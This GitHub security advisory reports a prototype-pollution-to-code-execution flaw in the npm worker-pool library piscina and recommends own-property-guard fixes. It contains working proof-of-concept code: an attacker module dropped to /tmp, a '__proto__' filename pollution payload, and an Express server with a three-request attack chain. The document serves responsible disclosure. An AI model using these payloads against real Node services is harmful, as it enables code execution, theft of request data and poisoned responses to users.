# [H] piscina: Prototype Pollution Gadget → RCE via inherited options.filename

## Summary
Severity: High
Advisory: GHSA-x9g3-xrwr-cwfg
CVE: CVE-2026-55388
CWE: CWE-1321, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-x9g3-xrwr-cwfg
Type: github-advisory

## Affected
- npm: `piscina` — affected >=5.0.0-alpha.0 <5.2.0
- npm: `piscina` — affected >=0 <4.9.3
- npm: `piscina` — affected >=6.0.0-rc.1 <6.0.0-rc.2

## Details
## Summary

`piscina`'s constructor and `run()` paths read the `filename` option via plain member access:

```js
// dist/index.js line 92 (constructor)
const filename = options.filename
  ? (0, common_1.maybeFileURLToPath)(options.filename)
  : null;
this.options = { ...kDefaultOptions, ...options, filename, maxQueue: 0 };

// dist/index.js line 616 (run())
run(task, options = kDefaultRunOptions) {
    if (options === null || typeof options !== 'object') {
        return Promise.reject(new TypeError('options must be an object'));
    }
    const { transferList, filename, name, signal } = options;
```

Both reads fall through the prototype chain when the caller's options object doesn't have `filename` as an own property. When `Object.prototype.filename` is polluted upstream — by any of the well-documented PP-source CVEs (lodash<4.17.13, qs<6.10.3, set-value<4.1.0, minimist<1.2.6, deepmerge<4.2.2, and others) — the inherited value flows to `worker_threads.Worker` import and the attacker's `.mjs` runs in the worker.

**Subtlety**: calling `pool.run(task)` with no second arg uses `kDefaultRunOptions` which has `filename: null` as an OWN property — that path DOES NOT fire. The vulnerable shape is when the caller passes their own options object (commonly `{signal: ac.signal}` for abort support, `{name: ...}` for task labelling, etc.). These caller-built options objects inherit from `Object.prototype` unless the caller explicitly uses `Object.create(null)`.

## Impact

Two preconditions:

1. **Upstream PP-source** somewhere in the process — common in transitive deps
2. **Attacker-controllable `.mjs`** at a known filesystem path — realistic via upload endpoints, /tmp races, predictable node_modules paths, or supply-chain

Once both fire:
- Every `pool.run(task, opts)` call across the entire process is hijacked
- Attacker's exported function is called with the legitimate caller's task data — **attacker reads per-request app data**
- Attacker controls the return value — caller receives `worker_response.by = "ATTACKER-WORKER"` and any other attacker-supplied response fields — **attacker can poison return values to legitimate clients**
- Hijack persists until process restart

Strictly worse than the analogous pino chain because piscina actually *invokes* the attacker function with caller data on every dispatch (pino imports the attacker module once and errors out).

## Affected versions

Empirically verified vulnerable on `piscina@5.1.4` (latest stable at time of disclosure). The bug shape is in the constructor's `options.filename` read at line 92 of `dist/index.js`, present since the worker-pool API stabilized — likely all 3.x / 4.x / 5.x affected.

## Proof of concept

### A) Minimal in-process PoC

```js
import fs from 'fs';

// 1) Drop the attacker module (any path the victim process can read)
fs.writeFileSync('/tmp/atk.mjs', `
  import fs from 'fs';
  fs.writeFileSync('/tmp/PISCINA_RCE_SENTINEL', JSON.stringify({
    rce: 'CONFIRMED', pid: process.pid, argv1: process.argv[1],
  }));
  export default function(arg) { return 'attacker-return-' + JSON.stringify(arg); }
`);

// 2) Upstream PP-source — pollute Object.prototype.filename
//    (representative of CVE-2019-10744 lodash<4.17.13, CVE-2022-24999 qs<6.10.3,
//     and ~30 historical PP-source CVEs)
const payload = JSON.parse('{"__proto__":{"filename":"/tmp/atk.mjs"}}');
function vulnMerge(t, s) {
  for (const k of Object.keys(s)) {
    if (s[k] !== null && typeof s[k] === 'object') {
      if (!t[k]) t[k] = {};
      vulnMerge(t[k], s[k]);
    } else t[k] = s[k];
  }
}
vulnMerge({}, payload);

// 3) Piscina with empty options inherits the polluted filename
const { Piscina } = await import('piscina');
const p = new Piscina({});                        // inherits filename
const result = await p.run({});                   // worker imports /tmp/atk.mjs
await p.destroy();

// 4) sentinel exists; attacker fn was called with task data
console.log(fs.readFileSync('/tmp/PISCINA_RCE_SENTINEL', 'utf8'));
console.log('attacker fn returned:', result);
// → "attacker-return-{}"
```

### B) Full-stack HTTP chain (this is the realistic shape)

A correctly-initialized pool gets hijacked by attacker activity. Pool is created at server boot with a legitimate worker, then per-request handlers call `pool.run(req.body, {signal: ac.signal})` — the standard abort-aware shape.

```js
// === server.mjs ===
import express from 'express';
import { Piscina } from 'piscina';

// Vulnerable PP-source middleware (lodash<4.17.13 equivalent)
function vulnMerge(t, s) {
  for (const k of Object.keys(s)) {
    if (s[k] !== null && typeof s[k] === 'object') {
      if (!t[k]) t[k] = {};
      vulnMerge(t[k], s[k]);
    } else t[k] = s[k];
  }
}

// CORRECT pool init at boot
const pool = new Piscina({
  filename: './valid-worker.mjs',
  minThreads: 1, maxThreads: 2,
});

const config = {};
const app = express();

app.post('/api/settings', express.json(), (req, res) => {
  vulnMerge(config, req.body);                    // PP source
  res.json({ ok: true });
});

app.post('/api/process', express.json(), async (req, res) => {
  const ac = new AbortController();
  const result = await pool.run(req.body, { signal: ac.signal });  // <-- hijacked
  res.json({ ok: true, worker_response: result });
});

app.listen(7755);

// === Attacker, 3 HTTP requests ===
// POST /upload  → drops /tmp/atk.mjs
// POST /api/settings with body: {"__proto__":{"filename":"/tmp/atk.mjs"}}
// POST /api/process → pool.run() destructures filename via prototype
//                  → worker imports /tmp/atk.mjs
//                  → attacker fn called with req.body of THIS request
//                  → caller receives attacker-shaped response
```

Empirical observation on `piscina@5.1.4` + Node 23.11.0:
- Pre-attack `/api/process` returns `{by: 'valid-worker'}`
- Cold-path `/probe` after PP source confirms `({}).filename` is polluted process-wide
- Post-attack `/api/process` returns `{by: 'ATTACKER-WORKER', processed: <caller's exfil data>}`
- Sentinel file written from inside `piscina/dist/worker.js` with the worker process's uid + env access

## Recommended fix

Minimal — own-property guard at both option-read sites:

```js
// constructor (line 92)
const userFilename = Object.prototype.hasOwnProperty.call(options, 'filename')
  ? options.filename
  : null;
const filename = userFilename
  ? (0, common_1.maybeFileURLToPath)(userFilename)
  : null;

// run() (line 616)
const safeOpts = Object.create(null);
Object.assign(safeOpts, options);          // copies own props only? — keeps shape
const { transferList, filename, name, signal } = safeOpts;
```

More idiomatic — use a null-prototype working object throughout `this.options`:

```js
const safeOpts = Object.create(null);
Object.assign(safeOpts, kDefaultOptions, options);
this.options = safeOpts;
this.options.filename = safeOpts.filename
  ? (0, common_1.maybeFileURLToPath)(safeOpts.filename)
  : null;
this.options.maxQueue = 0;
```

Either approach closes the gadget without breaking any legitimate caller pattern.

The pattern is the same as recommended for axios CVE-2026-44494 and the pino PSA filed earlier today. Cross-fix consideration: any other library you maintain that uses similar `options.X` member-access for worker / child-process / module-load operations is worth a quick audit.

## Coordination

- Same maintainer as pino — you're already in security-triage mode for that PSA. Happy to coordinate timing / disclosure dates across both.
- Will not share publicly until GHSA published or 90 days.
- Please credit `ridingsa` if you choose to credit a reporter.

## How this was discovered

Generalized the pino disclosure's mechanism — any library that reads a string option via plain member access and dynamic-loads it (via `import()` / `require()` / `new Worker()`) is a candidate. Ran a sweep across 10 candidate libraries; piscina + fastify (via pino propagation) fired. Piscina is independently vulnerable through its own option-read sites, hence this separate disclosure.

## References
- https://github.com/piscinajs/piscina/security/advisories/GHSA-x9g3-xrwr-cwfg
- https://github.com/piscinajs/piscina
